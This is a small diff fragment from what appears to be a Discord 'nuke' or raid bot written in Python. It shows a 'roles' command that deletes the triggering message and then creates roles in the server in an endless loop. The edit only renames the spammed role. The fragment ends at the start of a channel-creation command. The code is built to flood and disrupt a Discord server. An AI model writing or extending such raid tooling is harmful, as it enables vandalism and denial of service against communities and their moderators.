@@ -14,7 +14,7 @@ async def roles(ctx):
     await ctx.message.delete()
     while True:
         guild = ctx.guild
-        await guild.create_role(name="oh no o|o")
+        await guild.create_role(name="oh no")
 ##MAKE CHANNELS##
 @bot.command(pass_context=True)
 async def channels(ctx):
